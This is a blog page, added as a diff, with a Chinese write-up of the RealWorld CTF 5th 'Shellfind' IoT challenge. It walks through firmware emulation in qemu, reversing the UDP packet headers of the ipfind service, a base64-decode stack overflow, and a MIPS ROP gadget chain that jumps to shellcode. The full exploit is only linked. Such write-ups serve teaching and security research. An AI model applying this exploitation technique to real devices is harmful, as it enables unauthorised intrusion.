@@ -1,0 +1,449 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 7.0.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"fxc233.github.io","root":"/","scheme":"Mist","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="前言RealWorld CTF 5th 里的一道iot-pwn，根据真实设备固件改编而成，觉得题目贴近iot实战且很有意思，故在此记录一下复现过程。 题目分析题目描述12345678910111213Hello Hacker.You don&#x27;t know me, but I know you.I want to play a game. Here&#x27;s what happens">
+<meta property="og:type" content="article">
+<meta property="og:title" content="RealWorld-CTF-5th-Shellfind">
+<meta property="og:url" content="https://fxc233.github.io/2023/11/06/RealWorld-CTF-5th-Shellfind/index.html">
+<meta property="og:site_name" content="fxc233&#39;s blog">
+<meta property="og:description" content="前言RealWorld CTF 5th 里的一道iot-pwn，根据真实设备固件改编而成，觉得题目贴近iot实战且很有意思，故在此记录一下复现过程。 题目分析题目描述12345678910111213Hello Hacker.You don&#x27;t know me, but I know you.I want to play a game. Here&#x27;s what happens">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://fxc233.github.io/%5Cimg%5CRealWorld-CTF-5th-Shellfind%5C1.png">
+<meta property="og:image" content="https://fxc233.github.io/%5Cimg%5CRealWorld-CTF-5th-Shellfind%5C2.png">
+<meta property="og:image" content="https://fxc233.github.io/%5Cimg%5CRealWorld-CTF-5th-Shellfind%5C3.png">
+<meta property="og:image" content="https://fxc233.github.io/%5Cimg%5CRealWorld-CTF-5th-Shellfind%5C4.png">
+<meta property="og:image" content="https://fxc233.github.io/%5Cimg%5CRealWorld-CTF-5th-Shellfind%5C5.png">
+<meta property="og:image" content="https://fxc233.github.io/%5Cimg%5CRealWorld-CTF-5th-Shellfind%5C6.png">
+<meta property="og:image" content="https://fxc233.github.io/%5Cimg%5CRealWorld-CTF-5th-Shellfind%5C7.png">
+<meta property="og:image" content="https://fxc233.github.io/%5Cimg%5CRealWorld-CTF-5th-Shellfind%5C8.png">
+<meta property="og:image" content="https://fxc233.github.io/%5Cimg%5CRealWorld-CTF-5th-Shellfind%5C9.png">
+<meta property="og:image" content="https://fxc233.github.io/%5Cimg%5CRealWorld-CTF-5th-Shellfind%5C10.png">
+<meta property="og:image" content="https://fxc233.github.io/%5Cimg%5CRealWorld-CTF-5th-Shellfind%5C11.png">
+<meta property="og:image" content="https://fxc233.github.io/%5Cimg%5CRealWorld-CTF-5th-Shellfind%5C12.png">
+<meta property="article:published_time" content="2023-11-06T06:13:14.000Z">
+<meta property="article:modified_time" content="2023-11-06T07:13:42.851Z">
+<meta property="article:author" content="fxc233">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://fxc233.github.io/%5Cimg%5CRealWorld-CTF-5th-Shellfind%5C1.png">
+
+<link rel="canonical" href="https://fxc233.github.io/2023/11/06/RealWorld-CTF-5th-Shellfind/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'en'
+  };
+</script>
+
+  <title>RealWorld-CTF-5th-Shellfind | fxc233's blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">fxc233's blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+  <a href="https://github.com/fxc233" class="github-corner" title="fxc233 GitHub" aria-label="fxc233 GitHub" rel="noopener" target="_blank"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://fxc233.github.io/2023/11/06/RealWorld-CTF-5th-Shellfind/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="fxc233">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="fxc233's blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          RealWorld-CTF-5th-Shellfind
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+              
+
+              <time title="Created: 2023-11-06 14:13:14 / Modified: 15:13:42" itemprop="dateCreated datePublished" datetime="2023-11-06T14:13:14+08:00">2023-11-06</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>RealWorld CTF 5th 里的一道iot-pwn，根据真实设备固件改编而成，觉得题目贴近iot实战且很有意思，故在此记录一下复现过程。</p>
+<h3 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h3><h4 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Hello Hacker.</span><br><span class="line">You don&#x27;t know me, but I know you.</span><br><span class="line">I want to play a game. Here&#x27;s what happens if you lose.</span><br><span class="line">The device you are watching is hooked into your Saturday and Sunday.</span><br><span class="line">When the timer in the back goes off,</span><br><span class="line">your curiosity will be permanently ripped open.</span><br><span class="line">Think of it like a reverse bear trap.</span><br><span class="line">Here, I&#x27;ll show you.</span><br><span class="line">There is only one UDP service to shell the device.</span><br><span class="line">It&#x27;s in the stomach of your cold firmware.</span><br><span class="line">Look around Hacker. Know that I&#x27;m not lying.</span><br><span class="line">Better hurry up.</span><br><span class="line">Shell or out, make your choice.</span><br></pre></td></tr></table></figure>
+
+<p>从中可以看出漏洞大概率存在于<code>UDP</code>服务中。</p>
+<h4 id="固件分析"><a href="#固件分析" class="headerlink" title="固件分析"></a>固件分析</h4><p>拿到手的是一个<code>bin包</code>，解压出来可以得到一个完整的文件系统。相比于常规pwn题单一的二进制而言，我们首先要做的是寻找漏洞文件。既然是真实设备改编那我们就可以先在网上找一找官方固件并尝试下载最新版本。</p>
+<p><img src="/%5Cimg%5CRealWorld-CTF-5th-Shellfind%5C1.png"></p>
+<p>下载到官方的固件后，可以采取<code>bindiff</code>等方法去找被修改过的二进制文件。可以初步判定漏洞应该是出在<code>ipfind</code>程序中。</p>
+<p><img src="/%5Cimg%5CRealWorld-CTF-5th-Shellfind%5C2.png"></p>
+<p>并且发现此固件为<code>mips大端</code>，且可疑漏洞文件没开保护。</p>
+<h4 id="固件模拟"><a href="#固件模拟" class="headerlink" title="固件模拟"></a>固件模拟</h4><p>我是直接用<code>qemu</code>去模拟的这个固件，当然也可以尝试用<code>FirmAE</code>，<code>firmadyne</code>，<code>firmware-analysis-plus</code>等工具去进行模拟。我的<code>qemu</code>启动脚本如下：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">sudo ifconfig ens33 down</span><br><span class="line">sudo brctl addbr br0</span><br><span class="line">sudo brctl addif br0 ens33</span><br><span class="line">sudo ifconfig br0 0.0.0.0 promisc up</span><br><span class="line">sudo ifconfig ens33 0.0.0.0 promisc up</span><br><span class="line">sudo dhclient br0</span><br><span class="line">sudo tunctl -t tap0</span><br><span class="line">sudo brctl addif br0 tap0</span><br><span class="line">sudo ifconfig tap0 0.0.0.0 promisc up</span><br><span class="line">sudo ifconfig tap0 192.168.2.100/24 up</span><br><span class="line">sudo qemu-system-mips \</span><br><span class="line">    -M malta -kernel vmlinux-3.2.0-4-4kc-malta \</span><br><span class="line">    -hda debian_wheezy_mips_standard.qcow2 \</span><br><span class="line">    -append &quot;root=/dev/sda1 console=tty0&quot; \</span><br><span class="line">    -net nic,macaddr=00:16:3e:00:00:01 \</span><br><span class="line">    -net tap,ifname=tap0,script=no,downscript=no \</span><br><span class="line">    -nographic</span><br></pre></td></tr></table></figure>
+
+<p>启动完成之后用<code>scp</code>把固件包、gdbserver、完整的busybox等传上去。之后用如下命令切换到固件包根目录进行操作:</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mount -t proc /proc ./squashfs-root/proc</span><br><span class="line">mount -o bind /dev ./squashfs-root/dev</span><br><span class="line">chroot ./squashfs-root/ sh</span><br></pre></td></tr></table></figure>
+
+<p>之后通过<code>/etc/rc.d/rcS</code>初始化服务。</p>
+<p><img src="/%5Cimg%5CRealWorld-CTF-5th-Shellfind%5C3.png"></p>
+<p>启动完成之后通过<code>./busybox-mips netstat -pantu</code>去查看开放的端口及对应的二进制文件。</p>
+<p><img src="/%5Cimg%5CRealWorld-CTF-5th-Shellfind%5C4.png"></p>
+<p>可以看到我们之前分析的可疑文件<code>ipfind</code>正是<code>UDP</code>服务。</p>
+<p><img src="/%5Cimg%5CRealWorld-CTF-5th-Shellfind%5C5.png"></p>
+<p>值得注意的是我们用<code>ps</code>去查看进程发现执行的是<code>/usr/sbin/ipfind br0</code>这个命令，但我<code>qemu</code>的有效网卡是<code>eth0</code>，这样以后我们会发现无法使用<code>gdbserver</code>进行调试，故我们要杀死该进程，并执行<code>/usr/sbin/ipfind eth0 &amp;</code>，这样我们就可以使用gdbserver进行愉快的调试了。</p>
+<h4 id="漏洞文件分析"><a href="#漏洞文件分析" class="headerlink" title="漏洞文件分析"></a>漏洞文件分析</h4><p>首先是建立<code>socket通信</code>并绑定到<code>62720端口</code>，与刚才看到的端口一致。<br><img src="/%5Cimg%5CRealWorld-CTF-5th-Shellfind%5C6.png"></p>
+<p>接着从client端接收数据，并进行一系列的操作。之后会对数据进行一个判断，以此来确定是否进入<code>sub_40172C函数</code>或<code>sub_4013F4函数</code>。<br><img src="/%5Cimg%5CRealWorld-CTF-5th-Shellfind%5C7.png"></p>
+<h5 id="sub-40172C函数"><a href="#sub-40172C函数" class="headerlink" title="sub_40172C函数"></a>sub_40172C函数</h5><p>想进入这个函数我们可以逆出来他所需接受的内容开头应该为:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">header1 = <span class="string">b&quot;FIVI&quot;</span></span><br><span class="line">header1+= <span class="string">b&quot;\x00\x00\x00\x00&quot;</span></span><br><span class="line">header1+= <span class="string">b&quot;\x0A\x01\x00\x00&quot;</span></span><br><span class="line">header1+= <span class="string">b&quot;\x00\x00\x00\x00&quot;</span></span><br><span class="line">header1+= <span class="string">b&quot;\x00&quot;</span></span><br><span class="line">header1+= <span class="string">b&quot;\xFF\xFF\xFF\xFF\xFF\xFF&quot;</span></span><br><span class="line">header1+= <span class="string">b&quot;\x00\x00&quot;</span></span><br><span class="line">header1+= <span class="string">b&quot;\x00\x00\x00\x00&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>这个函数会调用<code>sub_400E50</code>得到<code>net_get_hwaddr(ifname, a1 + 17)</code>，实际上就是<code>mac addr</code>（<code>qemu</code>启动时可以进行设置，之后打印出来对比一下即可），并把它发送到<code>client端</code>。这个值对于我们进入第二个函数必不可少。</p>
+<p><img src="/%5Cimg%5CRealWorld-CTF-5th-Shellfind%5C8.png"></p>
+<p><img src="/%5Cimg%5CRealWorld-CTF-5th-Shellfind%5C9.png"></p>
+<p><img src="/%5Cimg%5CRealWorld-CTF-5th-Shellfind%5C10.png"></p>
+<h5 id="sub-4013F4函数"><a href="#sub-4013F4函数" class="headerlink" title="sub_4013F4函数"></a>sub_4013F4函数</h5><p>想进入这个函数我们可以逆出来它所需接受的内容开头应该为:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">header2 = <span class="string">b&quot;FIVI&quot;</span></span><br><span class="line">header2+= <span class="string">b&quot;\x00\x00\x00\x00&quot;</span></span><br><span class="line">header2+= <span class="string">b&quot;\x0A\x02\x00\x00&quot;</span></span><br><span class="line">header2+= <span class="string">b&quot;\x00\x00\x00\x00&quot;</span></span><br><span class="line">header2+= <span class="string">b&quot;\x00&quot;</span></span><br><span class="line">header2+= mac</span><br><span class="line">header2+= <span class="string">b&quot;\x00\x00&quot;</span></span><br><span class="line">header2+= <span class="string">b&quot;\x8E\x00\x00\x00&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>进入这个函数后，我们即可找到我们的漏洞函数<code>sub_400F50</code>，这个函数有两次<code>base64 decode</code>，第二次解码时会发生缓冲区溢出。</p>
+<p><img src="/%5Cimg%5CRealWorld-CTF-5th-Shellfind%5C11.png"></p>
+<h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>因为没开保护，我们布置好<code>rop</code>跳到<code>shellcode</code>上即可。但是我们由于没有<code>libc</code>地址，我们需要花费一定时间在<code>ipfind</code>这个文件里去找<code>gadgets</code>进行利用。</p>
+<p>我们想要跳转到<code>shellcode</code>上执行，那么我们就需要可以泄露栈地址的<code>gadget</code>，于是我们找到了如下的<code>gadget</code>来泄露栈地址：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">.text:004013D0 sub_4013D0:                              # CODE XREF: sub_4013F4+9C↓p</span><br><span class="line">.text:004013D0                                          # sub_4013F4+160↓p ...</span><br><span class="line">.text:004013D0</span><br><span class="line">.text:004013D0 var_8           = -8</span><br><span class="line">.text:004013D0 arg_4           =  4</span><br><span class="line">.text:004013D0 arg_8           =  8</span><br><span class="line">.text:004013D0 arg_C           =  0xC</span><br><span class="line">.text:004013D0</span><br><span class="line">.text:004013D0                 addiu   $sp, -0x10</span><br><span class="line">.text:004013D4                 sw      $a1, 0x10+arg_4($sp)</span><br><span class="line">.text:004013D8                 sw      $a2, 0x10+arg_8($sp)</span><br><span class="line">.text:004013DC                 sw      $a3, 0x10+arg_C($sp)</span><br><span class="line">.text:004013E0                 addiu   $v0, $sp, 0x10+arg_4</span><br><span class="line">.text:004013E4                 sw      $v0, 0x10+var_8($sp)</span><br><span class="line">.text:004013E8                 addiu   $sp, 0x10</span><br><span class="line">.text:004013EC                 jr      $ra</span><br><span class="line">.text:004013F0                 nop</span><br></pre></td></tr></table></figure>
+
+<p>这个<code>gadget</code>可以控制<code>v0</code>为栈地址，我们向上交叉引用找到一个既能控制<code>ra</code>又不改变<code>v0</code>的<code>gadget</code>下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">.text:00401F98                 jal     sub_4013D0</span><br><span class="line">.text:00401F9C                 li      $a0, aCanTGetHelloSo  # &quot;Can&#x27;t get hello socket\n&quot;</span><br><span class="line">.text:00401FA0                 b       loc_4020B4</span><br><span class="line">.text:00401FA4                 nop</span><br><span class="line"></span><br><span class="line">.text:004020B4 loc_4020B4:                              # CODE XREF: sub_401DF4+1AC↑j</span><br><span class="line">.text:004020B4                                          # sub_401DF4+238↑j ...</span><br><span class="line">.text:004020B4                 lw      $ra, 0x7C+var_s8($sp)</span><br><span class="line">.text:004020B8                 lw      $s1, 0x7C+var_s4($sp)</span><br><span class="line">.text:004020BC                 lw      $s0, 0x7C+var_s0($sp)</span><br><span class="line">.text:004020C0                 jr      $ra</span><br><span class="line">.text:004020C4                 addiu   $sp, 0x88</span><br></pre></td></tr></table></figure>
+
+<p>但是在走这条<code>gadget</code>之前我们得先恢复<code>gp</code>寄存器，并且还要考虑到<code>a1,a2,a3</code>寄存器对栈的影响，最好可以控制为<code>nop</code>指令，以免对刚才泄露出来的栈地址上指令造成影响。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">.text:00401218                 lw      $gp, 0x9C+var_8C($sp)</span><br><span class="line">.text:0040121C                 la      $t9, close</span><br><span class="line">.text:00401220                 jalr    $t9 ; close</span><br><span class="line">.text:00401224                 move    $a0, $s0         # fd</span><br><span class="line">.text:00401228                 move    $v0, $zero</span><br><span class="line">.text:0040122C</span><br><span class="line">.text:0040122C loc_40122C:                              # CODE XREF: sub_401120+80↑j</span><br><span class="line">.text:0040122C                                          # sub_401120+A0↑j</span><br><span class="line">.text:0040122C                 lw      $ra, 0x9C+var_s8($sp)</span><br><span class="line">.text:00401230                 lw      $s1, 0x9C+var_s4($sp)</span><br><span class="line">.text:00401234                 lw      $s0, 0x9C+var_s0($sp)</span><br><span class="line">.text:00401238                 jr      $ra</span><br><span class="line">.text:0040123C                 addiu   $sp, 0xA8</span><br></pre></td></tr></table></figure>
+
+<p>接着可以找到如下<code>gadget</code>使得可以跳转到<code>S0</code>寄存器存指向的地址中：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">.text:004027C0 loc_4027C0:                              # CODE XREF: sub_402790+3C↓j</span><br><span class="line">.text:004027C0                 jalr    $t9</span><br><span class="line">.text:004027C4                 nop</span><br><span class="line">.text:004027C8</span><br><span class="line">.text:004027C8 loc_4027C8:                              # CODE XREF: sub_402790+28↑j</span><br><span class="line">.text:004027C8                 lw      $t9, 0($s0)</span><br><span class="line">.text:004027CC                 bne     $t9, $s1, loc_4027C0</span><br><span class="line">.text:004027D0                 addiu   $s0, -4</span><br><span class="line">.text:004027D4                 lw      $ra, 0x1C+var_s8($sp)</span><br><span class="line">.text:004027D8                 lw      $s1, 0x1C+var_s4($sp)</span><br><span class="line">.text:004027DC                 lw      $s0, 0x1C+var_s0($sp)</span><br><span class="line">.text:004027E0                 jr      $ra</span><br><span class="line">.text:004027E4                 addiu   $sp, 0x28</span><br></pre></td></tr></table></figure>
+
+<p>最后找一个可以把<code>v0</code>赋给任意地址，并且可以控制<code>s0</code>的<code>gadget</code>即可：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">.text:00400F28                 sw      $v0, 0xD($s0)</span><br><span class="line">.text:00400F2C</span><br><span class="line">.text:00400F2C loc_400F2C:                              # CODE XREF: sub_400E50+CC↑j</span><br><span class="line">.text:00400F2C                 la      $v0, ifname</span><br><span class="line">.text:00400F30                 lw      $a0, (ifname - 0x413138)($v0)</span><br><span class="line">.text:00400F34                 la      $t9, net_get_hwaddr</span><br><span class="line">.text:00400F38                 jalr    $t9 ; net_get_hwaddr</span><br><span class="line">.text:00400F3C                 addiu   $a1, $s0, 0x11</span><br><span class="line">.text:00400F40                 lw      $ra, 0x20+var_s4($sp)</span><br><span class="line">.text:00400F44                 lw      $s0, 0x20+var_s0($sp)</span><br><span class="line">.text:00400F48                 jr      $ra</span><br><span class="line">.text:00400F4C                 addiu   $sp, 0x28</span><br></pre></td></tr></table></figure>
+
+<h3 id="exploit效果"><a href="#exploit效果" class="headerlink" title="exploit效果"></a>exploit效果</h3><p>完整exploit见：<a target="_blank" rel="noopener" href="https://github.com/fxc233/CTF/blob/main/IOT/RealWorldCTF-5th-ShellFind/exp.py">https://github.com/fxc233/CTF/blob/main/IOT/RealWorldCTF-5th-ShellFind/exp.py</a><br><img src="/%5Cimg%5CRealWorld-CTF-5th-Shellfind%5C12.png"></p>
+<h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/Wb7SMy8AHtiv71kroHEHsQ">https://mp.weixin.qq.com/s/Wb7SMy8AHtiv71kroHEHsQ</a></p>
+<p>文章首发：<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/SSDcTz9ZqBDWIhI0gsp7UA">ChaMd5 微信公众号</a></p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2023/11/06/%E6%9F%90%E6%91%84%E5%83%8F%E5%A4%B4%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E7%BB%8F%E5%8E%86/" rel="prev" title="某摄像头漏洞挖掘经历">
+      <i class="fa fa-chevron-left"></i> 某摄像头漏洞挖掘经历
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2023/11/06/%E5%86%99%E5%9C%A8%E5%A4%A7%E4%B8%80%E7%BB%93%E6%9D%9F/" rel="next" title="写在大一结束">
+      写在大一结束 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%A2%98%E7%9B%AE%E5%88%86%E6%9E%90"><span class="nav-number">2.</span> <span class="nav-text">题目分析</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%A2%98%E7%9B%AE%E6%8F%8F%E8%BF%B0"><span class="nav-number">2.1.</span> <span class="nav-text">题目描述</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%9B%BA%E4%BB%B6%E5%88%86%E6%9E%90"><span class="nav-number">2.2.</span> <span class="nav-text">固件分析</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%9B%BA%E4%BB%B6%E6%A8%A1%E6%8B%9F"><span class="nav-number">2.3.</span> <span class="nav-text">固件模拟</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" 